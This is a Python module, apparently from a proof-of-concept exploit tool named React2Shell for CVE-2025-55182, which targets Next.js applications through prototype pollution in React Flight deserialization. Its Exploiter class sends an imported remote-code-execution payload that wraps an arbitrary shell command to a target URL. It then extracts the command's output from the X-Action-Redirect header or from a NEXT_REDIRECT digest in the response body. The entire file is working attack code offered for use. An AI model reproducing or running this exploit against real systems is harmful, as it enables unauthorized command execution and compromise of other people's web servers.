"""
React2Shell - CVE-2025-55182 PoC Tool
Developed by @BlackTechX011

Exploits prototype pollution in React Flight Protocol deserialization
to achieve Remote Code Execution on vulnerable Next.js applications.
"""
from typing import Tuple, Optional
import re
from urllib.parse import unquote
from react2shell.utils.config import Config
from react2shell.utils.http import HTTPClient
from react2shell.core.payloads import PayloadGenerator

class Exploiter:
    def __init__(self, config: Config):
        self.config = config
        self.http = HTTPClient(config)
        self.payload_gen = PayloadGenerator(config)

    def execute_command(self, target: str, command: str) -> str:
        """
        Executes a command on the target and returns the output.
        """
        target = target.rstrip("/")
        body, content_type = self.payload_gen.get_rce_payload(cmd=command)
        
        resp, error = self.http.send(target, data=body, ContentType=content_type)
        
        if error:
            return f"Error: {error}"
            
        if not resp:
             return "Error: No response"

        # Extract output
        redirect = resp.headers.get("X-Action-Redirect", "")
        
        # Method 1: Header extraction
        match = re.search(r'/cmd\?out=([^;]+)', redirect)
        if match:
            return unquote(match.group(1))
            
        # Method 2: Body digest extraction
        match = re.search(r'"digest"\s*:\s*"([^"]+)"', resp.text)
        if match:
            digest = match.group(1)
            if "NEXT_REDIRECT" in digest:
                parts = digest.split(";")
                for part in parts:
                    if "out=" in part:
                        return unquote(part.split("out=", 1)[1])
        
        return "(Command executed, but no output captured)"
